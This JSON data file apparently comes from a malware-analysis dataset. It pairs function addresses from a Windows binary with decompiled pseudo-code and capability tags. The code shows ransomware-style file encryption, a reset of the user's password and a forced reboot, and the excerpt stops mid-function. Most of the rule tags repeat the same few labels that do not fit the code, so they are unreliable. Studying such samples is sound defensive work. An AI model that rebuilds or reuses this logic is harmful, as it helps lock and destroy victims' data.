{
    "00401045": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00401045(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x41c050 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(0x41c050, 0x104);\n        (*_sym.imp.KERNEL32.dll_GetSystemWow64DirectoryW)(0x41c260, 0x104);\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(0x41c468, 0x104);\n    }\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrIW;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(param_1, 0x41c050);\n    if (((iVar2 == 0) && (iVar2 = (*pcVar1)(param_1, 0x41c260),  iVar2 == 0)) &&\n       (iVar2 = (*pcVar1)(param_1, 0x41c468),  iVar2 == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 246
    },
    "004012ed": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012ed(uint lpString2, uint arg_ch, uint arg_10h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar4 = 0;\n    if (*0x41c670 != 0) {\n        iVar5 = 0;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(*(iVar5 + 8 + *0x41c258), lpString2);\n            if (iVar2 == 0) {\n                pcVar1 = uVar4 * 0xc + 4 + *0x41c258;\n                if (*pcVar1 == arg_ch) {\n                    return;\n                }\n                *pcVar1 = arg_ch;\n                if (arg_10h == '\\0') {\n                    return;\n                }\n                uVar3 = 0;\n                goto code_r0x0040137a;\n            }\n            uVar4 = uVar4 + 1;\n            iVar5 = iVar5 + 0xc;\n        } while (uVar4 < *0x41c670);\n    }\n    *0x41c258 = fcn.0040ae72();\n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    iVar2 = *0x41c258;\n    iVar5 = *0x41c670 * 0xc;\n    *(*0x41c670 * 0xc + *0x41c258) = uVar3;\n    iVar5 = iVar5 + iVar2;\n    uVar3 = fcn.0040bd22(lpString2);\n    *0x41c670 = *0x41c670 + 1;\n    *(iVar5 + 8) = uVar3;\n    *(iVar5 + 4) = arg_ch;\n    if (arg_10h != '\\0') {\n        uVar3 = 1;\ncode_r0x0040137a:\n        fcn.00401287(uVar3);\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "0040154c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar fcn.0040154c(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint uVar7;\n    uint uStack544;\n    uchar uStack537;\n    uint uStack536;\n    int32_t iStack532;\n    \n    if (param_1 == 0) {\n        iVar2 = fcn.0040bb38();\n        if ((iVar2 == 0) || (iVar2 = fcn.0040c762(),  iVar2 != 0)) {\n            fcn.00401a9e();\n            fcn.00408f0a();\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uStack544 = 1;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            uStack544 = 0;\n            uVar7 = 4;\n            puVar6 = &uStack544;\n            uVar5 = 4;\n            uVar3 = fcn.0040acd8();\n            uVar4 = fcn.0040acd8();\n            fcn.0040a731(0x80000002, uVar4, uVar3, uVar5, puVar6, uVar7);\n            fcn.0040143f(0x41d8e8);\n            fcn.00401ec7();\n            fcn.004014ef();\n            return 1;\n        }\ncode_r0x00401576:\n        fcn.004046e8();\n        return 1;\n    }\n    uVar3 = fcn.00405ff0();\n    fcn.0040143f(uVar3);\n    uStack537 = 0;\n    cVar1 = fcn.00401fa6(param_1);\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0040bb38();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040c762(),  iVar2 == 0)) goto code_r0x00401576;\n        cVar1 = fcn.004060a5(0, &uStack544);\n        if (cVar1 != '\\0') {\n            uStack544 = 0x41dc10;\n        }\n        fcn.0040acd8();\n        fcn.0040acd8();\n        iStack532 = fcn.0040a6f9();\n        if (iStack532 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar2 = iVar2 * 2;\n            uVar7 = 1;\n            uVar3 = uStack544;\n            uVar4 = fcn.0040acd8();\n            uVar5 = fcn.0040acd8();\n            cVar1 = fcn.0040a731(0x80000002, uVar5, uVar4, uVar7, uVar3, iVar2);\n            if (cVar1 != '\\0') {\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                fcn.0040acd8();\n                fcn.0040acd8();\n                iVar2 = fcn.0040a6f9();\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)();\n                    if (iVar2 == 0) {\n                        uStack544 = 0x104;\n                        (*_sym.imp.ADVAPI32.dll_GetUserNameW)();\n                        uStack536 = 0x4179a4;\n                        (*_sym.imp.NETAPI32.dll_NetUserSetInfo)();\n                        fcn.0040c920();\n                        cVar1 = fcn.00408ec8();\n                        if (cVar1 == '\\0') {\n                            uVar3 = fcn.0040acd8(0x4179d0);\n                            uVar5 = 0xc3affb79;\n                            uVar4 = 0x4179e8;\n                        }\n                        else {\n                            uVar3 = fcn.0040acd8(0x4179a8);\n                            uVar5 = 0x15e0516e;\n                            uVar4 = 0x4179c8;\n                        }\n                        uVar4 = fcn.0040acd8(uVar4, 7, uVar5);\n                        fcn.00408e33(uVar4, uVar3);\n                        uVar3 = fcn.00405ff0();\n                        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)();\n                        uVar5 = 0;\n                        uVar4 = fcn.0040acd8(0x417964, 5, 0xdfe64ba1, 0x40000000, 0, 0, 2, 0x80);\n                        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar4);\n                        if (iVar2 != -1) {\n                            (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, uVar3, uVar5, &stack0xfffffdac, 0);\n                            fcn.0040c13c();\n                        }\n                        (*_sym.imp.KERNEL32.dll_MoveFileExW)(0x41dc10, 0, 4);\n                        fcn.004010fb();\n                        fcn.00408d9a();\n                        uStack537 = 1;\n                    }\n                    fcn.0040af12();\n                }\n            }\n            fcn.0040af12();\n        }\n    }\n    fcn.004014ef();\n    return uStack537;\n}\n",
        "token_count": 1815
    },
    "00401ec7": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00401ec7(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_ch;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack4 [4];\n    \n    iVar4 = *0x41c670;\n    iVar3 = *0x41c258;\n    uVar2 = fcn.0040acd8(0x417bf0, 0x13, 0x25edd1cc);\n    fcn.0040c5a3(uVar2);\n    uVar2 = fcn.0040acd8(0x417c04, 0x18, 0x9c17dd62);\n    fcn.0040c5a3(uVar2);\n    if (iVar4 != 0) {\n        iVar3 = iVar3 + 8;\n        do {\n            if (*(iVar3 + -4) == '\\0') {\n                fcn.00401e88();\n            }\n            iVar3 = iVar3 + 0xc;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.0040c920(auStack4);\n    cVar1 = fcn.00408ec8();\n    if (cVar1 == '\\0') {\n        arg_ch = fcn.0040acd8(0x417c48, 0x1f, 0xb0fd8388);\n        uVar6 = 0x5692a3cc;\n        uVar5 = 0x417c68;\n        uVar2 = extraout_ECX_00;\n    }\n    else {\n        arg_ch = fcn.0040acd8(0x417c20, 0x1f, 0xae59c823);\n        uVar6 = 0x3037f0e0;\n        uVar5 = 0x417c40;\n        uVar2 = extraout_ECX;\n    }\n    uVar2 = fcn.0040acd8(uVar5, 7, uVar6, uVar2);\n    fcn.00408e33(uVar2, arg_ch);\n    fcn.00401cfa();\n    (*_sym.imp.USER32.dll_ExitWindowsEx)(2, 0x80020003);\n    return;\n}\n",
        "token_count": 535
    },
    "00402333": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00402333(uint param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint unaff_retaddr;\n    char cStack1;\n    \n    uVar6 = false;\n    iVar2 = fcn.0040cc7b(param_2, 2);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrIW;\n    if (iVar2 != 0) {\n        uVar3 = fcn.0040acd8(0x417b88, 9, 0x134cc92e);\n        (*pcVar1)(iVar2, uVar3);\n        iVar2 = (*pcVar1)(iVar2, unaff_retaddr);\n        uVar6 = iVar2 != 0;\n        uVar4 = fcn.0040af12();\n        cStack1 = param_1 >> 0x18;\n        if (cStack1 != '\\0') {\n            return uVar4 & 0xffffff00;\n        }\n        if (uVar6) goto code_r0x0040240c;\n    }\n    iVar2 = fcn.0040cc7b(param_2, 4);\n    if (iVar2 != 0) {\n        uVar3 = fcn.0040acd8(0x417b88, 9, 0x134cc92e);\n        iVar5 = (*pcVar1)(iVar2, uVar3);\n        if (iVar5 == 0) {\n            iVar2 = (*pcVar1)(iVar2, param_3);\n            uVar6 = iVar2 != 0;\n        }\n        uVar4 = fcn.0040af12();\n        if (uVar6 != false) goto code_r0x0040240c;\n    }\n    iVar2 = fcn.0040cc7b(param_2, 6);\n    if (iVar2 != 0) {\n        iVar2 = (*pcVar1)(iVar2, param_3);\n        uVar6 = iVar2 != 0;\n        uVar4 = fcn.0040af12();\n        if (uVar6) goto code_r0x0040240c;\n    }\n    uVar4 = fcn.00402231(param_2, param_3);\n    uVar6 = uVar4;\ncode_r0x0040240c:\n    return uVar4 & 0xffffff00 | uVar6;\n}\n",
        "token_count": 569
    },
    "00402709": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402709(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_44h;\n    code *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    code *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    code *var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint hKey;\n    \n    var_44h = fcn.0040acd8(0x417cd0, 0x33, 0xb1795f65);\n    var_40h = fcn.004025f2;\n    var_3ch._0_1_ = 1;\n    var_38h = fcn.0040acd8(0x417d04, 0x2d, 0x917e8280);\n    var_34h = fcn.00402414;\n    var_30h._0_1_ = 1;\n    var_2ch = fcn.0040acd8(0x417d38, 0x3f, 0x3ca4adfe);\n    var_28h = fcn.004025f2;\n    var_24h._0_1_ = 1;\n    var_20h = fcn.0040acd8(0x417d78, 0x39, 0xde658e41);\n    var_1ch = fcn.00402414;\n    var_18h._0_1_ = 1;\n    var_14h = fcn.0040acd8(0x417db4, 0x21, 0xef18946e);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    var_10h = fcn.004024e8;\n    var_ch._0_1_ = 0;\n    puVar3 = &var_44h;\n    var_8h = 5;\n    do {\n        iVar2 = (*pcVar1)(0x80000002, *puVar3, 0, 0x20119, &hKey);\n        if (iVar2 == 0) {\n            (*puVar3[1])(hKey, arg_8h, arg_ch);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        if (*(puVar3 + 2) != '\\0') {\n            iVar2 = (*pcVar1)(0x80000001, *puVar3, 0, 0x20119, &hKey);\n            if (iVar2 == 0) {\n                (*puVar3[1])(hKey, arg_8h, arg_ch);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n        puVar3 = puVar3 + 3;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    return;\n}\n",
        "token_count": 740
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040318d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040318d(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_210h;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar2 = fcn.00402ced(0x15ad);\n    if (uVar2 == '\\0') {\n        uVar3 = fcn.0040acd8(0x417fc0, 10, 0xd88c2583);\n        uVar4 = fcn.0040acd8(0x417fd0, 0x4c, 0xb61ebdaf);\n        iVar5 = fcn.00402c6e(uVar4, uVar3);\n        pcVar1 = _sym.imp.SHLWAPI.dll_StrStrIW;\n        if (iVar5 != 0) {\n            uVar3 = fcn.0040acd8(0x418084, 6, 0xec30dd17);\n            iVar5 = (*pcVar1)(iVar5, uVar3);\n            var_1h._0_1_ = iVar5 != 0;\n            uVar2 = fcn.0040af12();\n            if (var_1h != 0) goto code_r0x004033cc;\n        }\n        uVar3 = fcn.0040acd8(0x417f70, 0x11, 0xdfe9b373);\n        uVar4 = fcn.0040acd8(0x417f84, 0x1b, 0x1756a339);\n        iVar5 = fcn.00402c6e(uVar4, uVar3);\n        if (iVar5 != 0) {\n            uVar3 = fcn.0040acd8(0x41808c, 6, 0xd697bc3e);\n            iVar5 = (*pcVar1)(iVar5, uVar3);\n            var_1h._0_1_ = iVar5 != 0;\n            fcn.0040af12();\n        }\n        uVar3 = fcn.0040acd8(0x417fac, 0x10, 0x2c5afcb6);\n        uVar4 = fcn.0040acd8(0x417f84, 0x1b, 0x1756a339);\n        uVar2 = fcn.00402c6e(uVar4, uVar3);\n        if (uVar2 != 0) {\n            uVar3 = fcn.0040acd8(0x41808c, 6, 0xd697bc3e);\n            iVar5 = (*pcVar1)(uVar2, uVar3);\n            var_1h._0_1_ = iVar5 != 0;\n            uVar2 = fcn.0040af12();\n        }\n        if (var_1h == 0) {\n            uVar3 = fcn.0040acd8(0x418094, 0x22, 0xb85ba4ce, 0, 0x20119, &var_8h);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, uVar3);\n            if (iVar5 == 0) {\n                uVar2 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_8h);\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&var_210h, 0x104);\n                uVar3 = fcn.0040acd8(0x418068, 9, 0xfe37b72f);\n                pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_210h, uVar3);\n                iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&var_210h);\n                uVar3 = fcn.0040acd8(0x4180b8, 0xb, 0xaaef199f);\n                (*pcVar1)(&var_210h, uVar3);\n                uVar2 = fcn.0040cbc0(&var_210h);\n                if (uVar2 == 0) {\n                    *(&var_210h + iVar5 * 2) = 0;\n                    uVar3 = fcn.0040acd8(0x4180c4, 10, 0x97edbd70);\n                    (*pcVar1)(&var_210h, uVar3);\n                    uVar2 = fcn.0040cbc0(&var_210h);\n                    var_1h._0_1_ = uVar2 != 0;\n                    goto code_r0x004033cc;\n                }\n            }\n            var_1h._0_1_ = 1;\n        }\n    }\n    else {\n        var_1h._0_1_ = 1;\n    }\ncode_r0x004033cc:\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1184
    },
    "0040355c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040355c(uint lpExistingFileName, uint arg_ch, uint lpString2)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint *arg_10h;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint var_27ch;\n    uint lpNumberOfBytesRead;\n    uint lpLastWriteTime;\n    uint var_6ch;\n    uint lpLastAccessTime;\n    uint var_64h;\n    uint lpCreationTime;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t lpFileSize;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t n;\n    int32_t var_38h;\n    uint var_34h;\n    uint32_t lpNewFilePointer;\n    uint32_t var_28h;\n    uint lpNumberOfBytesWritten;\n    uint *var_20h;\n    int32_t lpBuffer;\n    int32_t s2;\n    int32_t nNumberOfBytesToWrite;\n    int32_t lpNewFileName;\n    uint32_t hFile;\n    uint var_6h;\n    \n    lpNewFileName = 0;\n    var_6h._0_1_ = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpExistingFileName, 0xc0000000, 0, 0, 3, 0, 0);\n    hFile = uVar3;\n    if (uVar3 == 0xffffffff) goto code_r0x00403a17;\n    (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(uVar3, &lpFileSize);\n    if ((*0x41c6a4 <= var_48h) && ((*0x41c6a4 < var_48h || (*0x41c6a0 <= lpFileSize)))) {\n        uVar9 = 0x1f;\n        fcn.0040d968(0xb, 0x1f);\n        uVar6 = arg_ch;\n        uVar9 = fcn.0040acd8(0x418108, 7, 0x6fa36381, uVar9, arg_ch, &var_27ch, *0x41df48);\n        fcn.0040beef(uVar9, uVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n        while (iVar4 = (*pcVar1)(lpNewFileName),  iVar4 != -1) {\n            fcn.0040af12();\n            lpNewFileName = 0;\n            uVar9 = 0x1f;\n            fcn.0040d968(0xb, 0x1f);\n            uVar6 = arg_ch;\n            uVar9 = fcn.0040acd8(0x418108, 7, 0x6fa36381, uVar9, arg_ch, &var_27ch, *0x41df48);\n            fcn.0040beef(uVar9, uVar6);\n        }\n        var_28h = *0x41c6b8;\n        nNumberOfBytesToWrite = 0;\n        var_20h = NULL;\n        var_6h._1_1_ = 0;\n        if ((var_48h < 0) || ((var_48h < 1 && (lpFileSize <= var_28h)))) {\n            var_28h = lpFileSize & 0xffff;\n        }\n        else {\n            iVar4 = lpFileSize - var_28h;\n            nNumberOfBytesToWrite = *0x41c6c4;\n            puVar5 = sub.ntdll.dll__alldiv(uVar9, var_48h - (lpFileSize < var_28h), *0x41c6c4, 0, iVar4);\n            if (*0x41c695 < puVar5) {\n                var_6h._1_1_ = *0x41c695;\n                var_20h = puVar5;\n            }\n            else {\n                var_6h._1_1_ = 1;\n                nNumberOfBytesToWrite = iVar4;\n            }\n        }\n        s2 = 0;\n        if (var_6h._1_1_ != 0) {\n            uVar3 = var_6h._1_1_;\n            s2 = fcn.0040ae05(0);\n            if (s2 == 0) goto code_r0x00403a0d;\n            uVar8 = 0;\n            if (uVar3 != 0) {\ncode_r0x004036ed:\n                do {\n                    iVar4 = fcn.0040c985();\n                    uVar7 = 0;\n                    if (uVar8 != 0) {\n                        do {\n                            if (*(s2 + uVar7 * 8) == iVar4) goto code_r0x004036ed;\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 < uVar8);\n                    }\n                    *(s2 + uVar8 * 8) = iVar4;\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 < uVar3);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_GetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        puVar5 = fcn.0040ae05(8);\n        if (puVar5 != NULL) {\n            uVar3 = *0x41c6b0;\n            (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, 0, 0, 0);\n            lpNewFilePointer = var_28h & 0xffff;\n            (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, uVar3 + 0x17 + puVar5, lpNewFilePointer, &lpNumberOfBytesRead, 0);\n            *puVar5 = 0x72627243;\n            uVar6 = fcn.0040c9e8();\n            puVar5[1] = uVar6;\n            *(puVar5 + 10) = var_6h._1_1_;\n            *(puVar5 + 0xb) = nNumberOfBytesToWrite;\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n            *(puVar5 + 2) = iVar2 * 2 + 2;\n            *(puVar5 + 0xf) = var_28h;\n            uVar6 = fcn.0040d9de();\n            *(puVar5 + 0x11) = uVar6;\n            *(puVar5 + 0x15) = *0x41c6b0;\n            fcn.0040f161(puVar5 + 0x17);\n            lpBuffer = 0;\n            if ((var_6h._1_1_ == 0) || (lpBuffer = fcn.0040ae05(0),  lpBuffer != 0)) {\n                n = var_6h._1_1_;\n                var_44h = *(puVar5 + 2) + 0x18 + n * 8;\n                arg_10h = fcn.0040ae05(0);\n                var_20h = arg_10h;\n                if (arg_10h != NULL) {\n                    arg_10h[1] = var_5ch;\n                    *arg_10h = lpCreationTime;\n                    arg_10h[3] = var_64h;\n                    arg_10h[2] = lpLastAccessTime;\n                    arg_10h[5] = var_6ch;\n                    arg_10h[4] = lpLastWriteTime;\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(arg_10h + 6, lpString2);\n                    var_38h = 0;\n                    var_58h = fcn.0040e1f7(puVar5, &var_38h);\n                    if (var_38h != 0) {\n                        var_40h = 0;\n                        if (n != 0) {\n                            do {\n                                iVar4 = *(s2 + var_40h * 8) * nNumberOfBytesToWrite + lpNewFilePointer;\n                                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, iVar4, 0, 0, 0);\n                                (*_sym.imp.KERNEL32.dll_ReadFile)\n                                          (hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n                                uVar6 = fcn.0040d9de();\n                                uVar3 = var_40h;\n                                *(s2 + 4 + var_40h * 8) = uVar6;\n                                fcn.0040b824(puVar5 + 0x17, *0x41c6b0, lpBuffer, nNumberOfBytesToWrite, 0);\n                                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, iVar4, 0, 0, 0);\n                                (*_sym.imp.KERNEL32.dll_WriteFile)\n                                          (hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n                                var_40h = uVar3 + 1;\n                                arg_10h = var_20h;\n                            } while (var_40h < n);\n                        }\n                        sub.ntdll.dll_memcpy(*(puVar5 + 2) + 0x18 + arg_10h, s2, n << 3);\n                        fcn.0040b824(puVar5 + 0x17, *0x41c6b0, arg_10h, var_44h, 0);\n                        uVar3 = hFile;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointer)(hFile, 0, 0, 0);\n                        if (var_28h != 0) {\n                            do {\n                                var_6h._0_1_ = fcn.0040c985();\n                                (*_sym.imp.KERNEL32.dll_WriteFile)(uVar3, &var_6h, 1, &lpNumberOfBytesWritten, 0);\n                                lpNewFilePointer = lpNewFilePointer - 1;\n                            } while (lpNewFilePointer != 0);\n                        }\n                        var_34h = 0;\n                        lpNewFilePointer = 0;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(uVar3, 0, 0, 0, 2);\n                        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n                        (*_sym.imp.KERNEL32.dll_WriteFile)(uVar3, var_20h, var_44h, &lpNumberOfBytesWritten, 0);\n                        (*pcVar1)(uVar3, var_38h, var_58h, &lpNumberOfBytesWritten, 0);\n                        (*pcVar1)(uVar3, *0x41c6b4, *0x41c698, &lpNumberOfBytesWritten, 0);\n                        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar3);\n                        var_54h = 0x18894;\n                        var_50h = 0x18894;\n                        (*_sym.imp.KERNEL32.dll_SetFileTime)(uVar3, &var_54h, &var_54h, &var_54h);\n                        fcn.0040af12();\n                        var_6h._0_1_ = 1;\n                    }\n                    fcn.0040af12();\n                }\n                fcn.0040af12();\n            }\n            fcn.0040af58();\n        }\n        fcn.0040af12();\n    }\ncode_r0x00403a0d:\n    uVar3 = fcn.0040c13c();\ncode_r0x00403a17:\n    if (lpNewFileName != 0) {\n        if (var_6h != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, lpNewFileName);\n            var_6h._0_1_ = iVar4 != 0;\n        }\n        uVar3 = fcn.0040af12();\n    }\n    return uVar3 & 0xffffff00 | var_6h;\n}\n",
        "token_count": 2788
    },
    "00403c08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c08(uint arg_8h, int32_t arg_ch, uint32_t hObject, uint32_t arg_14h)\n\n{\n    int32_t **ppiVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_58h;\n    uint32_t *var_54h;\n    uint var_4ch;\n    uint lpCriticalSection;\n    uint lpSystemInfo;\n    int32_t var_18h;\n    int32_t **var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.0040da7e();\n    puVar8 = &var_54h;\n    for (iVar7 = 10; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4ch = arg_14h;\n    var_58h = arg_8h;\n    puVar4 = fcn.0040ae05(0);\n    var_54h = puVar4;\n    uVar5 = fcn.00409aaf();\n    *puVar4 = uVar5;\n    puVar4[1] = *puVar4;\n    uVar5 = fcn.0040ae05(0);\n    puVar4[2] = uVar5;\n    arg_14h = 0;\n    if (hObject != 0) {\n        do {\n            ppiVar1 = arg_ch + arg_14h * 4;\n            var_8h = ppiVar1;\n            sub.ntdll.dll_memcpy(uVar5, 